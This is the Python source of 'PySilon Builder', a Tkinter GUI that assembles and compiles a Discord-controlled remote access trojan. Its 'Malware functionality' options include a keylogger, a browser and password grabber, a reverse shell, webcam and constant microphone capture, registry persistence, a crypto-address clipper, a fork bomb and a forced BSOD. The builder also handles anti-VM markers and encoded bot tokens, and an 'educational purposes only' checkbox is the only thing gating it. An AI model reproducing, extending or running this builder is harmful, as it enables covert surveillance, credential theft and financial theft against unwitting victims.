from tkinter import *
from tkinter import filedialog
from PIL import ImageTk, Image
import configparser
import shutil
import compiler
import sys
import os
import subprocess

window_icon = 'resources/icons/icon.ico'; Image.open('resources/icons/icon.ico').resize((120, 120)).save('icon.png', format='PNG')
config_path, status = 'configuration.ini', 'configuration'
config = configparser.ConfigParser()
config['SETTINGS'], config['FUNCTIONALITY'] = {}, {}
debug_mode = False

filenames = {
    'keylogr': 'keylogger.py',
    'scrnsht': 'screenshot.py',
    'regstry': 'registry.py',
    'f_downl': 'file_downloading.py',
    'f_upldg': 'file_uploading.py',
    'f_rmval': 'file_removal.py',
    'f_explr': 'file_explorer.py',
    'grabber': 'grabber.py',
    'mc_live': 'live_microphone.py',
    'mc_recc': 'microphone_recording.py',
    'process': 'process.py',
    'rev_shl': 'reverse_shell.py',
    'webcam_': 'webcam.py',
    'scrnrec': 'screenrec.py',
    'inputbl': 'block_input.py',
    'bluesod': 'bsod.py',
    'crclipr': 'crypto_clipper.py',
    'forkbmb': 'fork_bomb.py'
}

default_modules = [
    'from urllib.request import urlopen\n'
    'from itertools import islice\n',
    'from resources.misc import *\n',
    'import subprocess\n',
    'import discord\n',
    'import asyncio\n',
    'import sys\n',
    'import os\n',
]


def get_file_path(file_types):
    root2 = Tk()
    root2.withdraw()
    root2.attributes('-topmost', True)
    open_dir = filedialog.askopenfilename(filetypes=file_types)
    root2.destroy()
    return open_dir

def load_configuration(is_custom):
    global config, config_path
    config = configparser.ConfigParser()
    if is_custom:
        config_file = get_file_path([('Configuration files', '.ini')])
        config.read(config_file)
        config_path = config_file
    else:
        config.read('configuration.ini')
        config_path = 'configuration.ini'

    server_id.delete(0, END); server_id.insert(0, config['SETTINGS']['server_id'])
    bot_token_1.delete(0, END); bot_token_1.insert(0, config['SETTINGS']['bot_token_1'])
    bot_token_2.delete(0, END); bot_token_2.insert(0, config['SETTINGS']['bot_token_2'])
    bot_token_3.delete(0, END); bot_token_3.insert(0, config['SETTINGS']['bot_token_3'])
    registry_name.delete(0, END); registry_name.insert(0, config['SETTINGS']['registry_name'])
    directory_name.delete(0, END); directory_name.insert(0, config['SETTINGS']['directory_name'])
    executable_name.delete(0, END); executable_name.insert(0, config['SETTINGS']['executable_name'])
    change_icon(config['SETTINGS']['icon_path'])

    cbvar_keylogger.set(config['FUNCTIONALITY']['keylogr'])
    cbvar_screenshot.set(config['FUNCTIONALITY']['scrnsht'])
    cbvar_registry.set(config['FUNCTIONALITY']['regstry'])
    cbvar_file_downloading.set(config['FUNCTIONALITY']['f_downl'])
    cbvar_file_uploading.set(config['FUNCTIONALITY']['f_upldg'])
    cbvar_file_removal.set(config['FUNCTIONALITY']['f_rmval'])
    cbvar_file_explorer.set(config['FUNCTIONALITY']['f_explr'])
    cbvar_grabber.set(config['FUNCTIONALITY']['grabber'])
    cbvar_live_microphone.set(config['FUNCTIONALITY']['mc_live'])
    cbvar_microphone_recording.set(config['FUNCTIONALITY']['mc_recc'])
    cbvar_processes.set(config['FUNCTIONALITY']['process'])
    cbvar_reverse_shell.set(config['FUNCTIONALITY']['rev_shl'])
    cbvar_webcam.set(config['FUNCTIONALITY']['webcam_'])
    cbvar_scrnrec.set(config['FUNCTIONALITY']['scrnrec'])
    cbvar_inputbl.set(config['FUNCTIONALITY']['inputbl'])
    cbvar_bluesod.set(config['FUNCTIONALITY']['bluesod'])
    cbvar_crclipr.set(config['FUNCTIONALITY']['crclipr'])
    cbvar_forkbmb.set(config['FUNCTIONALITY']['forkbmb'])

def reset_configuration():
    server_id.delete(0, END)
    bot_token_1.delete(0, END)
    bot_token_2.delete(0, END)
    bot_token_3.delete(0, END)
    registry_name.delete(0, END)
    directory_name.delete(0, END)
    executable_name.delete(0, END)

    cbvar_keylogger.set(True)
    cbvar_screenshot.set(True)
    cbvar_registry.set(True)
    cbvar_file_downloading.set(True)
    cbvar_file_uploading.set(True)
    cbvar_file_removal.set(True)
    cbvar_file_explorer.set(True)
    cbvar_grabber.set(True)
    cbvar_live_microphone.set(True)
    cbvar_microphone_recording.set(True)
    cbvar_processes.set(True)
    cbvar_reverse_shell.set(True)
    cbvar_webcam.set(True)
    cbvar_scrnrec.set(True)
    cbvar_inputbl.set(True)
    cbvar_bluesod.set(True)
    cbvar_crclipr.set(True)
    cbvar_forkbmb.set(True)
    cbvar_disclaimer.set(False)

    change_icon('resources/icons/icon.ico')
    generate_source_btn['state'] = DISABLED
    generate_source_btn['text'] = 'Generate source'
    compile_btn['state'] = DISABLED

def save_configuration():
    global config, window_icon, config_path
    config = configparser.ConfigParser()
    config['SETTINGS'], config['FUNCTIONALITY'] = {}, {}

    config['SETTINGS'], config['FUNCTIONALITY'] = {}, {}
    config['SETTINGS']['server_id'] = server_id.get()
    config['SETTINGS']['bot_token_1'] = bot_token_1.get()
    config['SETTINGS']['bot_token_2'] = bot_token_2.get()
    config['SETTINGS']['bot_token_3'] = bot_token_3.get()
    config['SETTINGS']['registry_name'] = registry_name.get()
    config['SETTINGS']['directory_name'] = directory_name.get()
    config['SETTINGS']['executable_name'] = executable_name.get()
    config['SETTINGS']['spam_channel'] = str(cbvar_keylogger.get())
    config['SETTINGS']['file-related_channel'] = ('True' if (cbvar_file_explorer.get() or cbvar_file_downloading.get() or cbvar_file_uploading.get() or cbvar_file_removal.get()) else 'False')
    config['SETTINGS']['recordings_channel'] = str(cbvar_microphone_recording.get())
    config['SETTINGS']['voice_channel'] = str(cbvar_live_microphone.get())
    config['SETTINGS']['icon_path'] = window_icon

    config['FUNCTIONALITY']['keylogr'] = str(cbvar_keylogger.get())
    config['FUNCTIONALITY']['scrnsht'] = str(cbvar_screenshot.get())
    config['FUNCTIONALITY']['regstry'] = str(cbvar_registry.get())
    config['FUNCTIONALITY']['f_downl'] = str(cbvar_file_downloading.get())
    config['FUNCTIONALITY']['f_upldg'] = str(cbvar_file_uploading.get())
    config['FUNCTIONALITY']['f_rmval'] = str(cbvar_file_removal.get())
    config['FUNCTIONALITY']['f_explr'] = str(cbvar_file_explorer.get())
    config['FUNCTIONALITY']['grabber'] = str(cbvar_grabber.get())
    config['FUNCTIONALITY']['mc_live'] = str(cbvar_live_microphone.get())
    config['FUNCTIONALITY']['mc_recc'] = str(cbvar_microphone_recording.get())
    config['FUNCTIONALITY']['process'] = str(cbvar_processes.get())
    config['FUNCTIONALITY']['rev_shl'] = str(cbvar_reverse_shell.get())
    config['FUNCTIONALITY']['webcam_'] = str(cbvar_webcam.get())
    config['FUNCTIONALITY']['scrnrec'] = str(cbvar_scrnrec.get())
    config['FUNCTIONALITY']['inputbl'] = str(cbvar_inputbl.get())
    config['FUNCTIONALITY']['bluesod'] = str(cbvar_bluesod.get())
    config['FUNCTIONALITY']['crclipr'] = str(cbvar_crclipr.get())
    config['FUNCTIONALITY']['forkbmb'] = str(cbvar_forkbmb.get())

    with open(config_path, 'w') as configfile:
        config.write(configfile)

def disclaimer_toggle():
    if cbvar_disclaimer.get():
        generate_source_btn['state'] = NORMAL
    else:
        config_modification()
        generate_source_btn['state'] = DISABLED

def debug_toggle():
    global debug_mode
    if not debug_mode:
        debug_mode_btn['text'] = 'Debug mode [ON]'
        debug_mode_btn['fg'] = 'white'
        debug_mode = True
    else:
        debug_mode_btn['text'] = 'Debug mode [OFF]'
        debug_mode_btn['fg'] = 'gray'
        debug_mode = False

def assemble_source_code():
    global source_code_modifiers, status, config_path
    
    source_code_modifiers = {
        '$modules': [],
        '!opus_initialization': [],
        '!registry': [],
        '!recording_startup': [],
        '!cookies_submit': [],
        '!registry_implosion': [],
        'on reaction add': [],
        'on message': [],
        'on message end': [],
        'anywhere': [],
        'bottom': []
    }
    
    save_configuration()
    config = configparser.ConfigParser(); config.read(config_path)

    try: shutil.rmtree('resources/source_code/tmp')
    except: pass
    os.mkdir('resources/source_code/tmp')
    for file in filenames.keys():
        shutil.copy(f'resources/source_code/{filenames[file]}', f'resources/source_code/tmp/{filenames[file]}')
        with open(f'resources/source_code/tmp/{filenames[file]}', 'r', encoding='utf-8') as get_raw_source:
            source_unlogged = get_raw_source.readlines()
        with open(f'resources/source_code/{filenames[file]}', 'w', encoding='utf-8') as log_source:
            for line_number, line in enumerate(source_unlogged):
                if len(line.lstrip()) > 0:
                    if line.lstrip()[:6] == '#.log ':
                        log_source.write(' '*(len(line)-len(line.lstrip()))+f'{line.lstrip()[:-1]}({filenames[file]}:{line_number})*\n')
                    else:
                        log_source.write(line)
    
    for individual_functionality in config['FUNCTIONALITY'].keys():
        if config['FUNCTIONALITY'][individual_functionality] == 'True':
            with open('resources/source_code/' + filenames[individual_functionality], 'r', encoding='utf-8') as copy_function:
                expectation = '$modules'
                for line in copy_function.readlines():
                    if line == '# end of imports\n':
                        expectation = '?'

                    elif line.replace('# ', '', 1)[:-1] in list(source_code_modifiers.keys()):
                        expectation = line.replace('# ', '', 1)[:-1]

                    elif expectation != '?':
                        source_code_modifiers[expectation].append(line)

                        
    modules_unique = []
    for module in source_code_modifiers['$modules']:
        if module not in modules_unique and module not in default_modules:
            modules_unique.append(module)
    source_code_modifiers['$modules'] = modules_unique

    with open('source.py', 'r', encoding='utf-8') as source_template:
        with open('source_assembled.py', 'w', encoding='utf-8') as source_assembled:
            for base_line in source_template.readlines():
                if base_line[:16] == '# [pysilon_var] ':
                    variable_intendation = int(base_line[-2])
                    variable_name = base_line.replace('# [pysilon_var] ', '', 1)[:-3]
                    if len(source_code_modifiers[variable_name]) > 0:
                        source_assembled.write('    '*variable_intendation + ('    '*variable_intendation).join(source_code_modifiers[variable_name]))
                    else: source_assembled.write('\n')
                    if base_line == '# [pysilon_var] bottom 0\n' and config['FUNCTIONALITY']['keylogr'] == 'False':
                        source_assembled.write('for token in bot_tokens:\n    decoded_token = base64.b64decode(token).decode()\n    try:\n        client.run(decoded_token)\n    except: pass')
                elif '# [pysilon_mark] !debug' in base_line and not debug_mode: pass
                elif '# [pysilon_mark] !anti-vm' in base_line and debug_mode: pass
                else:
                    source_assembled.write(base_line)
    
    for file in filenames.keys():
        os.system(f'del resources\\source_code\\{filenames[file]}')
        shutil.copy(f'resources/source_code/tmp/{filenames[file]}', f'resources/source_code/{filenames[file]}')
    shutil.rmtree('resources/source_code/tmp')

    generate_source_btn['state'] = DISABLED
    generate_source_btn['text'] = 'Source generated'
    if status != 'compiled': compile_btn['state'] = NORMAL
    status = 'assembled'

def change_icon(path=False):
    global icon_photo, config, window_icon
    if not path:
        new_icon = get_file_path([('Image files', '.jpg .png .ico')])
        if new_icon == '': return
    else: new_icon = path
    window_icon = new_icon
    Image.open(new_icon).resize((120, 120)).save('icon.png', format='PNG')
    icon_photo = PhotoImage(file='icon.png')
    icon_btn['image'] = icon_photo
    config['SETTINGS']['icon_path'] = new_icon
    config_modification()

def compile_source():
    global status, debug_mode
    custom_imports = configparser.ConfigParser()
    custom_imports.read('resources/custom_imports.ini')
    with open('custom_imports.txt', 'w') as imports_file:
        imports_file.write('pynacl\n')
        for functionality in config['FUNCTIONALITY'].keys():
            if config['FUNCTIONALITY'][functionality] == 'True':
                for custom_import in custom_imports[functionality].keys():
                    if custom_import != 'nothing_special':
                        imports_file.write(custom_imports[functionality][custom_import] + '\n')
        for general_packages in custom_imports['general'].keys():
            imports_file.write(custom_imports['general'][general_packages] + '\n')

    response = compiler.compile(debug_mode)
    compile_btn['state'] = DISABLED
    status = 'compiled'

def config_modification(var=None, index=None, mode=None):
    global status
    if status == 'assembled':
        status = 'configuration'
        generate_source_btn['state'] = NORMAL
        generate_source_btn['text'] = 'Generate source'
        compile_btn['state'] = DISABLED

if len(sys.argv) > 1:
    if sys.argv[1] == '--cli':
        cli = 'soon' # CLI mode will be added soon...
else:
    root = Tk()
    root.geometry('750x700')
    root.resizable(True, True)
    root.iconbitmap('resources/icons/icon.ico')
    root.title('PySilon Builder')
    root.configure(bg='#0A0A10')
    root.tk_setPalette(background='#0A0A10', foreground='white', activeBackground='#0A0A10', activeForeground='white')

    my_canvas = Canvas(root, width=1, height=1, bd=0)
    Button(my_canvas, text='Load configuration', command=lambda:load_configuration(False)).grid(row=1, column=1, padx=(10, 0), pady=10)
    Button(my_canvas, text='Load custom...', command=lambda:load_configuration(True)).grid(row=1, column=2, padx=(10, 0), pady=10)
    Button(my_canvas, text='Reset', command=reset_configuration).grid(row=1, column=3, padx=(10, 0), pady=10)
    Button(my_canvas, text='Save', command=save_configuration).grid(row=1, column=4, padx=(10, 0), pady=10)
    my_canvas.pack(anchor=NW)

    settings_canvas = Canvas(root, width=1, height=1, bd=0)
    Label(settings_canvas, text='General settings:', justify=RIGHT, anchor=E).grid(row=2, padx=(30, 5), pady=(30, 2), sticky=E)
    Label(settings_canvas, text='Server ID*:', justify=RIGHT, anchor=E).grid(row=3, padx=(30, 5), pady=2, sticky=E)
    Label(settings_canvas, text='Bot Token*:', justify=RIGHT, anchor=E).grid(row=4, padx=(30, 5), pady=2, sticky=E)
    Label(settings_canvas, text='Emergency Token 1:', justify=RIGHT, anchor=E).grid(row=5, padx=(30, 5), pady=2, sticky=E)
    Label(settings_canvas, text='Emergency Token 2:', justify=RIGHT, anchor=E).grid(row=6, padx=(30, 5), pady=2, sticky=E)
    Label(settings_canvas, text='Registry Name*:', justify=RIGHT, anchor=E).grid(row=7, padx=(30, 5), pady=2, sticky=E)
    Label(settings_canvas, text='Folder Name*:', justify=RIGHT, anchor=E).grid(row=8, padx=(30, 5), pady=2, sticky=E)
    Label(settings_canvas, text='Executable name*:', justify=RIGHT, anchor=E).grid(row=9, padx=(30, 5), pady=2, sticky=E)
    Label(settings_canvas, text='Icon*:', justify=RIGHT, anchor=E).grid(row=10, padx=(30, 5), pady=2, sticky=E)
    
    icon_photo = PhotoImage(file='icon.png')
    icon_btn = Button(settings_canvas, image=icon_photo, state=NORMAL, width=120, height=120, command=change_icon)
    icon_btn.grid(row=10, column=1, pady=2, sticky=NW, rowspan=6)

    debug_mode_btn = Button(settings_canvas, text='Debug mode [OFF]', fg='gray', state=NORMAL, width=12, height=1, command=debug_toggle)
    debug_mode_btn.grid(row=15, column=1, padx=(5, 5), pady=10, sticky=NSEW, rowspan=2)

    var_server_id = StringVar()
    var_bot_token_1 = StringVar()
    var_bot_token_2 = StringVar()
    var_bot_token_3 = StringVar()
    var_registry_name = StringVar()
    var_directory_name = StringVar()
    var_executable_name = StringVar()
    server_id = Entry(settings_canvas, textvariable=var_server_id)
    bot_token_1 = Entry(settings_canvas, textvariable=var_bot_token_1)
    bot_token_2 = Entry(settings_canvas, textvariable=var_bot_token_2)
    bot_token_3 = Entry(settings_canvas, textvariable=var_bot_token_3)
    registry_name = Entry(settings_canvas, textvariable=var_registry_name)
    directory_name = Entry(settings_canvas, textvariable=var_directory_name)
    executable_name = Entry(settings_canvas, textvariable=var_executable_name)
    

    var_server_id.trace_add("write", config_modification)
    var_bot_token_1.trace_add("write", config_modification)
    var_bot_token_2.trace_add("write", config_modification)
    var_bot_token_3.trace_add("write", config_modification)
    var_registry_name.trace_add("write", config_modification)
    var_directory_name.trace_add("write", config_modification)
    var_executable_name.trace_add("write", config_modification)
    server_id.grid(row=3, column=1)
    bot_token_1.grid(row=4, column=1)
    bot_token_2.grid(row=5, column=1)
    bot_token_3.grid(row=6, column=1)
    registry_name.grid(row=7, column=1)
    directory_name.grid(row=8, column=1)
    executable_name.grid(row=9, column=1)
    settings_canvas.pack(anchor=NW, fill=X)

    Label(settings_canvas, text='Malware functionality:', justify=LEFT, anchor=W).grid(row=2, column=2, padx=(30, 0), pady=(30, 0), sticky=W)

    cbvar_keylogger = BooleanVar(value=True)
    cbvar_screenshot = BooleanVar(value=True)
    cbvar_registry = BooleanVar(value=True)
    cbvar_file_downloading = BooleanVar(value=True)
    cbvar_file_uploading = BooleanVar(value=True)
    cbvar_file_removal = BooleanVar(value=True)
    cbvar_file_explorer = BooleanVar(value=True)
    cbvar_grabber = BooleanVar(value=True)
    cbvar_live_microphone = BooleanVar(value=True)
    cbvar_microphone_recording = BooleanVar(value=True)
    cbvar_processes = BooleanVar(value=True)
    cbvar_reverse_shell = BooleanVar(value=True)
    cbvar_webcam = BooleanVar(value=True)
    cbvar_scrnrec = BooleanVar(value=True)
    cbvar_inputbl = BooleanVar(value=True)
    cbvar_bluesod = BooleanVar(value=True)
    cbvar_crclipr = BooleanVar(value=True)
    cbvar_forkbmb = BooleanVar(value=True)

    def open_crypto_clipper_config():
        json_file_path = 'resources/crypto_clipper.json'
        if os.path.exists(json_file_path):
            subprocess.Popen(['notepad.exe', json_file_path])

    cb_keylogger = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='keylogger', variable=cbvar_keylogger, command=config_modification, onvalue=True, offvalue=False)
    cb_screenshot = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='screenshots', variable=cbvar_screenshot, command=config_modification, onvalue=True, offvalue=False)
    cb_registry = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='enable on startup (via registry injection)', variable=cbvar_registry, command=config_modification, onvalue=True, offvalue=False)
    cb_file_downloading = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='file downloading', variable=cbvar_file_downloading, command=config_modification, onvalue=True, offvalue=False)
    cb_file_uploading = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='file uploading', variable=cbvar_file_uploading, command=config_modification, onvalue=True, offvalue=False)
    cb_file_removal = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='file removal', variable=cbvar_file_removal, command=config_modification, onvalue=True, offvalue=False)
    cb_file_explorer = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='file exploring', variable=cbvar_file_explorer, command=config_modification, onvalue=True, offvalue=False)
    cb_grabber = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='grabber (WiFi, saved passwords, browser history, cookies, Discord)', variable=cbvar_grabber, command=config_modification, onvalue=True, offvalue=False)
    cb_live_microphone = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='live microphone (via discord voice chat)', variable=cbvar_live_microphone, command=config_modification, onvalue=True, offvalue=False)
    cb_microphone_recording = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='24/7 microphone recording (.wav files sent on channel)', variable=cbvar_microphone_recording, command=config_modification, onvalue=True, offvalue=False)
    cb_processes = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='manage processes', variable=cbvar_processes, command=config_modification, onvalue=True, offvalue=False)
    cb_reverse_shell = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='reverse shell (execute remote cmd commands)', variable=cbvar_reverse_shell, command=config_modification, onvalue=True, offvalue=False)
    cb_webcam = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='take webcam photos', variable=cbvar_webcam, command=config_modification, onvalue=True, offvalue=False)
    cb_scrnrec = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='screen recording', variable=cbvar_scrnrec, command=config_modification, onvalue=True, offvalue=False)
    cb_inputbl = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='block input (mouse & keyboard)', variable=cbvar_inputbl, command=config_modification, onvalue=True, offvalue=False)
    cb_bluesod = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='trigger a bsod', variable=cbvar_bluesod, command=config_modification, onvalue=True, offvalue=False)
    cb_forkbmb = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='fork bomb (spam processes to crash os)', variable=cbvar_forkbmb, command=config_modification, onvalue=True, offvalue=False)
    cb_crclipr = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='crypto clipper (replaces crypto addresses)', variable=cbvar_crclipr, command=config_modification, onvalue=True, offvalue=False)
    json_button = Button(settings_canvas, text='⚙', command=open_crypto_clipper_config)

    cb_keylogger.grid(row=3, column=2, sticky=W, padx=(30, 0))
    cb_screenshot.grid(row=4, column=2, sticky=W, padx=(30, 0))
    cb_registry.grid(row=5, column=2, sticky=W, padx=(30, 0))
    cb_file_downloading.grid(row=6, column=2, sticky=W, padx=(30, 0))
    cb_file_uploading.grid(row=7, column=2, sticky=W, padx=(30, 0))
    cb_file_removal.grid(row=8, column=2, sticky=W, padx=(30, 0))
    cb_file_explorer.grid(row=9, column=2, sticky=W, padx=(30, 0))
    cb_grabber.grid(row=10, column=2, sticky=W, padx=(30, 0))
    cb_live_microphone.grid(row=11, column=2, sticky=W, padx=(30, 0))
    cb_microphone_recording.grid(row=12, column=2, sticky=W, padx=(30, 0))
    cb_scrnrec.grid(row=13, column=2, sticky=W, padx=(30, 0))
    cb_processes.grid(row=14, column=2, sticky=W, padx=(30, 0))
    cb_reverse_shell.grid(row=15, column=2, sticky=W, padx=(30, 0))
    cb_inputbl.grid(row=16, column=2, sticky=W, padx=(30, 0))
    cb_webcam.grid(row=17, column=2, sticky=W, padx=(30, 0))
    cb_bluesod.grid(row=18, column=2, sticky=W, padx=(30, 0))
    cb_forkbmb.grid(row=19, column=2, sticky=W, padx=(30, 0))
    cb_crclipr.grid(row=20, column=2, sticky=W, padx=(30, 0), pady=(0, 30))
    json_button.grid(row=20, column=2, padx=(190, 0), pady=(0, 30))

    bottom_buttons = Canvas(root, width=1, height=1, bd=0)
    cbvar_disclaimer = BooleanVar(value=False)
    cb_disclaimer = Checkbutton(bottom_buttons, selectcolor='#0A0A10', text='  I\'m aware that this malware has been made for educational purposes only, and the creator is no way responsible\n  for any direct or indirect damage caused due to the misusage of the information. Everything I do, I\'m doing at\n  my own risk and responsibility.', variable=cbvar_disclaimer, command=disclaimer_toggle, onvalue=True, offvalue=False, justify=LEFT, anchor=W)
    cb_disclaimer.grid(row=1)
    bottom_buttons.pack(pady=(20, 0))

    bottom_buttons = Canvas(root, width=1, height=1, bd=0)
    generate_source_btn = Button(bottom_buttons, text='Generate source', state=DISABLED, command=assemble_source_code)
    generate_source_btn.grid(row=1, column=1, padx=(10, 0), pady=10)
    compile_btn = Button(bottom_buttons, text='Compile', state=DISABLED, command=compile_source)
    compile_btn.grid(row=1, column=2, padx=10, pady=10)
    bottom_buttons.pack(anchor=E, side='bottom')

    server_id.focus_set()
    root.mainloop()
